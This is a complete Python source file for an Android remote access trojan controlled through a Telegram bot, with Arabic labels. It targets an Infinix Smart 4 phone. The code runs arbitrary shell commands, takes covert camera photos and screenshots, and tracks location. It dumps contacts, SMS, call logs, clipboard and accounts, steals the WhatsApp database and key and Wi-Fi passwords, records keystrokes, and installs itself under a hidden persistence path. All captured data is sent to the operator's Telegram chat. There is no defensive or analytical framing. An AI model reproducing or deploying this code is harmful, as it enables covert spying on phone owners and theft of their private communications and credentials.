#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Infinix Smart 4 - Telegram RAT
Android Remote Access Tool via Telegram Bot C2
Target: Infinix Smart 4 (MT6761 | Android 9 Go | API 28)
"""

import os, sys, time, json, base64, threading, subprocess, requests
from datetime import datetime

# ============ CONFIG ============
BOT_TOKEN = "7123456789:AAH_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"  # غير هذا
CHAT_ID = "123456789"  # غير هذا
# ================================

API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
POLL_INTERVAL = 2
MAX_MSG = 4096

try:
    from modules.shell import ShellExecutor
    from modules.files import FileManager
    from modules.camera import CameraController
    from modules.location import LocationTracker
    from modules.contacts_sms import ContactsSMSDumper
    from modules.whatsapp import WhatsAppExtractor
    from modules.keylogger import KeyloggerManager
    from modules.persistence import PersistenceManager
    MODS = True
except ImportError:
    MODS = False


class TelegramRAT:
    def __init__(self):
        self.last_update_id = 0
        self.running = True
        self.device_info = {}
        self._init_device_info()
        if MODS:
            self.shell = ShellExecutor()
            self.files = FileManager(self)
            self.camera = CameraController(self)
            self.location = LocationTracker(self)
            self.contacts_sms = ContactsSMSDumper(self)
            self.whatsapp = WhatsAppExtractor(self)
            self.keylogger = KeyloggerManager(self)
            self.persistence = PersistenceManager()
        else:
            self.shell = self.files = self.camera = self.location = None
            self.contacts_sms = self.whatsapp = self.keylogger = self.persistence = None

    def _init_device_info(self):
        props = {
            'model': 'ro.product.model', 'brand': 'ro.product.brand',
            'manufacturer': 'ro.product.manufacturer', 'android': 'ro.build.version.release',
            'sdk': 'ro.build.version.sdk', 'security_patch': 'ro.build.version.security_patch',
            'chipset': 'ro.board.platform', 'hardware': 'ro.hardware',
            'cpu_abi': 'ro.product.cpu.abi', 'build_id': 'ro.build.id',
        }
        info = {}
        for k, p in props.items():
            try:
                v = subprocess.getoutput(f"getprop {p} 2>/dev/null").strip()
                info[k] = v if v else "?"
            except:
                info[k] = "?"
        try:
            ip = subprocess.getoutput("ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1").strip()
            if not ip:
                ip = subprocess.getoutput("ip addr show rmnet0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1").strip()
            info['ip'] = ip if ip else "?"
        except:
            info['ip'] = "?"
        try:
            batt = subprocess.getoutput("dumpsys battery 2>/dev/null | grep 'level:' | awk '{print $2}'").strip()
            info['battery'] = f"{batt}%" if batt else "?"
        except:
            info['battery'] = "?"
        try:
            df = subprocess.getoutput("df -h /sdcard 2>/dev/null | tail -1").split()
            info['storage_free'] = df[3] if len(df) >= 4 else "?"
            info['storage_total'] = df[1] if len(df) >= 4 else "?"
        except:
            info['storage_free'] = info['storage_total'] = "?"
        try:
            root = subprocess.getoutput("which su 2>/dev/null").strip()
            info['rooted'] = "Yes" if root else "No"
        except:
            info['rooted'] = "?"
        try:
            up = subprocess.getoutput("cat /proc/uptime 2>/dev/null | awk '{print $1}'").strip()
            if up:
                s = int(float(up))
                h, m = divmod(s, 3600)
                m, sec = divmod(m, 60)
                info['uptime'] = f"{h}h {m}m"
            else:
                info['uptime'] = "?"
        except:
            info['uptime'] = "?"
        self.device_info = info

    # === Telegram API ===
    def send_message(self, text: str):
        if not text:
            return
        try:
            for i in range(0, len(text), MAX_MSG):
                chunk = text[i:i + MAX_MSG]
                requests.post(f"{API_URL}/sendMessage", data={"chat_id": CHAT_ID, "text": chunk, "parse_mode": "HTML"}, timeout=15)
        except:
            pass

    def send_file(self, filepath: str, caption: str = "") -> bool:
        try:
            if not os.path.exists(filepath):
                self.send_message(f"❌ غير موجود: {filepath}")
                return False
            if os.path.getsize(filepath) > 50 * 1024 * 1024:
                self.send_message("⚠️ كبير > 50MB")
                return False
            with open(filepath, 'rb') as f:
                resp = requests.post(f"{API_URL}/sendDocument", data={"chat_id": CHAT_ID, "caption": caption}, files={"document": f}, timeout=120)
            return resp.status_code == 200
        except:
            return False

    def send_photo(self, filepath: str, caption: str = "") -> bool:
        try:
            if not os.path.exists(filepath):
                return False
            with open(filepath, 'rb') as f:
                resp = requests.post(f"{API_URL}/sendPhoto", data={"chat_id": CHAT_ID, "caption": caption}, files={"photo": f}, timeout=60)
            return resp.status_code == 200
        except:
            return False

    def send_location_tg(self, lat: float, lon: float):
        try:
            requests.post(f"{API_URL}/sendLocation", data={"chat_id": CHAT_ID, "latitude": lat, "longitude": lon}, timeout=10)
        except:
            pass

    def get_updates(self):
        try:
            resp = requests.get(f"{API_URL}/getUpdates", params={"offset": self.last_update_id + 1, "timeout": 15}, timeout=20)
            if resp.status_code == 200:
                data = resp.json()
                if data.get('ok') and data.get('result'):
                    for update in data['result']:
                        self.last_update_id = update['update_id']
                        if 'message' not in update:
                            continue
                        msg = update['message']
                        sender_id = str(msg.get('from', {}).get('id', ''))
                        if sender_id != CHAT_ID:
                            continue
                        if 'text' in msg:
                            return ('text', msg['text'].strip(), msg.get('message_id'))
                        if 'document' in msg:
                            doc = msg['document']
                            return ('document', {'file_id': doc['file_id'], 'file_name': doc.get('file_name', 'unknown')}, None)
                        if 'photo' in msg:
                            return ('photo', msg['photo'][-1]['file_id'], None)
        except:
            pass
        return (None, None, None)

    # === Command Handler ===
    def execute_command(self, command: str) -> str:
        cmd = command.strip()

        if cmd.startswith('/shell ') or cmd.startswith('/sh '):
            arg = cmd.split(' ', 1)[1] if ' ' in cmd else ''
            if not arg:
                return "❌ استخدم: /shell <أمر>"
            if self.shell:
                return self.shell.execute(arg)
            return self._shell_fallback(arg)

        if cmd.startswith('/cmd '):
            arg = cmd.split(' ', 1)[1] if ' ' in cmd else ''
            if not arg:
                return "❌ استخدم: /cmd <أمر>"
            if self.shell:
                return self.shell.execute(arg)
            return self._shell_fallback(arg)

        if cmd == '/info' or cmd == '/device':
            return self._cmd_info()

        if cmd == '/ping':
            return "🟢 pong!"

        if cmd == '/help' or cmd == '/start':
            return self._cmd_help()

        if cmd == '/screenshot' or cmd == '/ss':
            return self._cmd_screenshot()

        if cmd == '/photo' or cmd == '/cam':
            if self.camera:
                return self.camera.take_photo(0)
            return self._cam_fallback(0)

        if cmd == '/selfie':
            if self.camera:
                return self.camera.take_photo(1)
            return self._cam_fallback(1)

        if cmd == '/location' or cmd == '/gps' or cmd == '/loc':
            if self.location:
                return self.location.get_location()
            return self._loc_fallback()

        if cmd == '/contacts':
            if self.contacts_sms:
                return self.contacts_sms.dump_contacts()
            return self._contacts_fallback()

        if cmd == '/sms':
            if self.contacts_sms:
                return self.contacts_sms.dump_sms()
            return self._sms_fallback()

        if cmd == '/calllogs' or cmd == '/calls':
            if self.contacts_sms:
                return self.contacts_sms.dump_call_logs()
            return self._calllog_fallback()

        if cmd == '/whatsapp' or cmd == '/wa':
            if self.whatsapp:
                return self.whatsapp.extract_all()
            return self._wa_fallback()

        if cmd == '/wadb':
            if self.whatsapp:
                return self.whatsapp.extract_database()
            return self._wa_fallback()

        if cmd.startswith('/download '):
            path = cmd.split(' ', 1)[1].strip()
            return self._cmd_download(path)

        if cmd.startswith('/ls ') or cmd.startswith('/dir '):
            path = cmd.split(' ', 1)[1].strip()
            return self._cmd_list(path)

        if cmd == '/clipboard' or cmd == '/clip':
            return self._cmd_clipboard()

        if cmd == '/keylog':
            if self.keylogger:
                return self.keylogger.start_logging(60)
            return self._keylog_fallback()

        if cmd == '/keystop':
            if self.keylogger:
                return self.keylogger.stop_logging()
            return "⚠️ لا keylogger نشط"

        if cmd == '/accounts':
            return self._cmd_accounts()

        if cmd == '/wifi':
            return self._cmd_wifi()

        if cmd == '/apps':
            return self._cmd_apps()

        if cmd == '/persist':
            if self.persistence:
                return self.persistence.install()
            return self._persist_fallback()

        return f"❌ أمر غير معروف: {cmd}\nاكتب /help"

    # === Command Implementations ===
    def _cmd_info(self) -> str:
        d = self.device_info
        return f"""📱 معلومات الجهاز | Infinix Smart 4
━━━━━━━━━━━━━━━━━━━━━━━━
🏷️ الموديل: {d.get('model','?')}
🏭 المصنع: {d.get('manufacturer','?')} | {d.get('brand','?')}
📱 أندرويد: {d.get('android','?')} (SDK {d.get('sdk','?')})
🛡️ تصحيح أمني: {d.get('security_patch','?')}
🔧 المعالج: {d.get('chipset','?')}
💻 العتاد: {d.get('hardware','?')}
📐 المعمارية: {d.get('cpu_abi','?')}
🌐 IP: {d.get('ip','?')}
🔋 البطارية: {d.get('battery','?')}
💾 التخزين: {d.get('storage_free','?')} / {d.get('storage_total','?')}
👑 روت: {d.get('rooted','?')}
⏱️ مدة التشغيل: {d.get('uptime','?')}
🕐 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""

    def _cmd_help(self) -> str:
        return """📋 قائمة الأوامر
━━━━━━━━━━━━━━━━━━
📱 /info - معلومات الجهاز
📸 /screenshot - لقطة شاشة
📷 /photo - كاميرا خلفية
🤳 /selfie - كاميرا أمامية
📍 /gps - الموقع الجغرافي
👥 /contacts - جهات الاتصال
💬 /sms - الرسائل النصية
📞 /calllogs - سجل المكالمات
💚 /whatsapp - واتساب كامل
🔑 /wadb - قاعدة واتساب فقط
📁 /ls مسار - تصفح الملفات
📥 /download مسار - سحب ملف
📋 /clipboard - الحافظة
⌨️ /keylog - Keylogger 60 ث
📶 /wifi - شبكات WiFi
👤 /accounts - الحسابات
📦 /apps - التطبيقات
🔧 /shell أمر - تنفيذ شيل
🔒 /persist - تثبيت البقاء
🟢 /ping - فحص الاتصال"""

    def _cmd_screenshot(self) -> str:
        path = "/sdcard/ss_rat.png"
        os.system(f"screencap -p {path} 2>/dev/null")
        time.sleep(1)
        if os.path.exists(path) and os.path.getsize(path) > 0:
            sent = self.send_photo(path, "📸 لقطة شاشة")
            os.system(f"rm -f {path}")
            return "✅ لقطة شاشة" if sent else "⚠️ التقطت لكن فشل الإرسال"
        return "❌ فشل"

    def _cmd_download(self, path: str) -> str:
        if not os.path.exists(path):
            return f"❌ غير موجود: {path}"
        if os.path.isdir(path):
            import zipfile
            dn = os.path.basename(path.rstrip('/'))
            zp = f"/sdcard/{dn}_dump.zip"
            fc = 0
            for _, _, fs in os.walk(path):
                fc += len(fs)
            if fc > 500:
                return f"⚠️ كبير ({fc} ملف)"
            try:
                with zipfile.ZipFile(zp, 'w', zipfile.ZIP_DEFLATED) as zf:
                    for root, _, files in os.walk(path):
                        for file in files:
                            fp = os.path.join(root, file)
                            try:
                                zf.write(fp, os.path.relpath(fp, os.path.dirname(path)))
                            except:
                                pass
                sz = os.path.getsize(zp)
                sent = self.send_file(zp, f"📁 {dn} | {fc} ملف | {sz/1024:.1f}KB")
                os.system(f"rm -f {zp}")
                return f"✅ {dn}" if sent else "❌ فشل"
            except Exception as e:
                os.system(f"rm -f {zp}")
                return f"❌ {e}"
        else:
            sz = os.path.getsize(path)
            fn = os.path.basename(path)
            sent = self.send_file(path, f"📄 {fn} ({sz/1024:.1f}KB)")
            return f"✅ {fn}" if sent else "❌ فشل"

    def _cmd_list(self, path: str) -> str:
        try:
            if not os.path.exists(path):
                return f"❌ غير موجود: {path}"
            if not os.path.isdir(path):
                return self._cmd_download(path)
            items = sorted(os.listdir(path))
            if not items:
                return f"📂 {path} (فارغ)"
            result = f"📂 {path}\n{'─'*40}\n"
            dc, fc = 0, 0
            for item in items:
                full = os.path.join(path, item)
                try:
                    if os.path.isdir(full):
                        result += f"📁 {item}/\n"
                        dc += 1
                    else:
                        sz = os.path.getsize(full)
                        szs = f"{sz/1024:.1f}KB" if sz<1024*1024 else f"{sz/1024/1024:.1f}MB"
                        result += f"📄 {item} ({szs})\n"
                        fc += 1
                except:
                    pass
            result += f"\n📊 {dc} مجلد | {fc} ملف"
            return result
        except Exception as e:
            return f"❌ {e}"

    def _cmd_clipboard(self) -> str:
        try:
            clip = subprocess.getoutput("dumpsys clipboard 2>/dev/null")
            if clip and "No items" not in clip:
                return f"📋 الحافظة:\n{clip[:3000]}"
            return "📋 فارغة"
        except:
            return "❌ فشل"

    def _cmd_accounts(self) -> str:
        try:
            acc = subprocess.getoutput("dumpsys account 2>/dev/null | grep 'Account {' | head -20")
            return f"👤 الحسابات:\n{acc[:3500]}" if acc.strip() else "❌ فشل"
        except:
            return "❌ خطأ"

    def _cmd_wifi(self) -> str:
        try:
            wf = "/data/misc/wifi/wpa_supplicant.conf"
            if os.path.exists(wf):
                output = subprocess.getoutput(f"cat {wf} 2>/dev/null")
                lines = output.split('\n')
                nets = []
                for ln in lines:
                    if 'ssid=' in ln or 'psk=' in ln:
                        nets.append(ln.strip())
                if nets:
                    return "📶 WiFi:\n" + "\n".join(nets[:20])
            return "⚠️ لا صلاحيات (يحتاج root)"
        except:
            return "❌ خطأ"

    def _cmd_apps(self) -> str:
        try:
            apps = subprocess.getoutput("pm list packages 2>/dev/null | head -40")
            return f"📦 التطبيقات:\n{apps[:3800]}" if apps.strip() else "❌ فشل"
        except:
            return "❌ خطأ"

    # === Fallback Methods ===
    def _shell_fallback(self, command: str) -> str:
        try:
            output = subprocess.getoutput(command)
            if not output:
                return f"✅ تم: {command}"
            return f"🖥️ {command}\n{output[:3500]}"
        except Exception as e:
            return f"❌ {e}"

    def _cam_fallback(self, cam_id: int) -> str:
        label = "أمامية" if cam_id else "خلفية"
        path = f"/sdcard/cam_{cam_id}_rat.jpg"
        facing = f"--ei android.intent.extras.CAMERA_FACING {cam_id}"
        try:
            os.system(f"am start -a android.media.action.IMAGE_CAPTURE {facing} 2>/dev/null")
            time.sleep(3)
            os.system("input keyevent 66 2>/dev/null")
            time.sleep(2)
            os.system("input keyevent 4 2>/dev/null")
            for dcim in ["/sdcard/DCIM/Camera", "/sdcard/DCIM", "/sdcard/Pictures"]:
                if os.path.exists(dcim):
                    latest = subprocess.getoutput(f"ls -t {dcim}/*.jpg {dcim}/*.png 2>/dev/null | head -1").strip()
                    if latest and os.path.exists(latest):
                        os.system(f"cp '{latest}' {path}")
                        break
            if os.path.exists(path) and os.path.getsize(path) > 100:
                sent = self.send_photo(path, f"📷 {label}")
                os.system(f"rm -f {path}")
                return f"✅ {label}" if sent else "⚠️ التقطت لكن فشل الإرسال"
            return f"❌ فشل {label}"
        except Exception as e:
            return f"❌ {e}"

    def _loc_fallback(self) -> str:
        try:
            loc = subprocess.getoutput("dumpsys location 2>/dev/null | grep -A 5 'Last Known' | head -30")
            import re
            coords = re.findall(r'[-]?\d{2,3}\.\d{3,8}', loc)
            if len(coords) >= 2:
                lat, lon = float(coords[0]), float(coords[1])
                self.send_location_tg(lat, lon)
                return f"📍 {lat}, {lon}\n🔗 https://maps.google.com/?q={lat},{lon}"
            return "❌ لا يمكن تحديد الموقع"
        except:
            return "❌ خطأ"

    def _contacts_fallback(self) -> str:
        for src in [
            "/data/data/com.android.providers.contacts/databases/contacts2.db",
            "/data/data/com.google.android.contacts/databases/contacts2.db",
        ]:
            if os.path.exists(src):
                dst = "/sdcard/contacts_dump.db"
                os.system(f"cp {src} {dst} 2>/dev/null")
                if os.path.exists(dst) and os.path.getsize(dst) > 0:
                    sz = os.path.getsize(dst)
                    sent = self.send_file(dst, f"📇 جهات اتصال ({sz/1024:.1f}KB)")
                    os.system(f"rm -f {dst}")
                    return f"✅ جهات اتصال ({sz/1024:.1f}KB)" if sent else "⚠️ فشل إرسال"
        return "❌ لا صلاحيات"

    def _sms_fallback(self) -> str:
        for src in [
            "/data/data/com.android.providers.telephony/databases/mmssms.db",
            "/data/data/com.android.mms/databases/mmssms.db",
        ]:
            if os.path.exists(src):
                dst = "/sdcard/sms_dump.db"
                os.system(f"cp {src} {dst} 2>/dev/null")
                if os.path.exists(dst) and os.path.getsize(dst) > 0:
                    sz = os.path.getsize(dst)
                    sent = self.send_file(dst, f"💬 SMS ({sz/1024:.1f}KB)")
                    os.system(f"rm -f {dst}")
                    return f"✅ SMS ({sz/1024:.1f}KB)" if sent else "⚠️ فشل إرسال"
        return "❌ لا صلاحيات"

    def _calllog_fallback(self) -> str:
        for src in [
            "/data/data/com.android.providers.contacts/databases/calllog.db",
            "/data/data/com.android.dialer/databases/calllog.db",
        ]:
            if os.path.exists(src):
                dst = "/sdcard/calllog_dump.db"
                os.system(f"cp {src} {dst} 2>/dev/null")
                if os.path.exists(dst) and os.path.getsize(dst) > 0:
                    sz = os.path.getsize(dst)
                    sent = self.send_file(dst, f"📞 مكالمات ({sz/1024:.1f}KB)")
                    os.system(f"rm -f {dst}")
                    return f"✅ مكالمات ({sz/1024:.1f}KB)" if sent else "⚠️ فشل إرسال"
        return "❌ لا صلاحيات"

    def _wa_fallback(self) -> str:
        results = []
        for dbp in [
            "/sdcard/Android/media/com.whatsapp/WhatsApp/Databases/msgstore.db",
            "/sdcard/WhatsApp/Databases/msgstore.db",
        ]:
            if os.path.exists(dbp):
                sz = os.path.getsize(dbp)
                sent = self.send_file(dbp, f"💚 واتساب ({sz/1024:.1f}KB)")
                results.append(f"✅ واتساب ({sz/1024:.1f}KB)" if sent else "⚠️ فشل")
                break
        else:
            results.append("❌ واتساب غير موجود")

        for kp in ["/data/data/com.whatsapp/files/key", "/data/data/com.whatsapp.w4b/files/key"]:
            if os.path.exists(kp):
                dst = "/sdcard/wa_key"
                os.system(f"cp {kp} {dst} 2>/dev/null")
                if os.path.exists(dst) and os.path.getsize(dst) > 0:
                    sent = self.send_file(dst, "🔑 مفتاح واتساب")
                    os.system(f"rm -f {dst}")
                    results.append("✅ مفتاح" if sent else "⚠️ فشل مفتاح")
                break
        return "\n".join(results)

    def _keylog_fallback(self) -> str:
        lf = "/sdcard/.keylog_tmp.txt"
        os.system(f"rm -f {lf}")
        os.system(f"timeout 60 getevent -l > {lf} 2>/dev/null &")
        time.sleep(62)
        os.system("killall getevent 2>/dev/null")
        if os.path.exists(lf) and os.path.getsize(lf) > 0:
            sent = self.send_file(lf, "⌨️ Keylogger 60s")
            os.system(f"rm -f {lf}")
            return "✅ Keylogger" if sent else "⚠️ فشل"
        return "⚠️ لم يسجل شيء"

    def _persist_fallback(self) -> str:
        try:
            dest = "/data/local/tmp/.sys_core"
            os.system(f"cp {os.path.abspath(__file__)} {dest} 2>/dev/null && chmod 755 {dest} 2>/dev/null")
            if os.path.exists(dest):
                return "✅ Persistence مثبت"
            return "⚠️ فشل جزئي"
        except:
            return "❌ فشل"

    # === File Upload Handler ===
    def _handle_incoming_file(self, data: dict):
        try:
            fid = data.get('file_id', '')
            fname = data.get('file_name', f'upload_{int(time.time())}')
            resp = requests.get(f"{API_URL}/getFile?file_id={fid}", timeout=10).json()
            if not resp.get('ok'):
                self.send_message("❌ فشل")
                return
            furl = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{resp['result']['file_path']}"
            content = requests.get(furl, timeout=120).content
            sp = f"/sdcard/{fname}"
            with open(sp, 'wb') as f:
                f.write(content)
            self.send_message(f"✅ تم الرفع: {sp} ({len(content)/1024:.1f}KB)")
        except Exception as e:
            self.send_message(f"❌ {e}")

    # === Main Loop ===
    def run(self):
        online_msg = f"""🟢 تم الاتصال بجهاز Infinix Smart 4!
الجهاز: {self.device_info.get('model','?')}
أندرويد: {self.device_info.get('android','?')}
المعالج: {self.device_info.get('chipset','?')}
IP: {self.device_info.get('ip','?')}
البطارية: {self.device_info.get('battery','?')}
الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
اكتب /help للأوامر"""
        self.send_message(online_msg)

        try:
            if self.persistence:
                self.persistence.install()
            else:
                self._persist_fallback()
        except:
            pass

        errors = 0
        while self.running:
            try:
                mtype, data, mid = self.get_updates()
                if mtype == 'text' and data:
                    result = self.execute_command(data)
                    if result:
                        self.send_message(result)
                    errors = 0
                elif mtype == 'document' and data:
                    self._handle_incoming_file(data)
                    errors = 0
                else:
                    time.sleep(POLL_INTERVAL)
            except KeyboardInterrupt:
                break
            except:
                errors += 1
                time.sleep(5 if errors < 10 else 30)


def main():
    rat = TelegramRAT()
    try:
        pm = PersistenceManager() if MODS else None
        if pm:
            pm.install()
    except:
        pass
    while True:
        try:
            rat.run()
        except:
            time.sleep(10)
            rat = TelegramRAT()


if __name__ == '__main__':
    main()
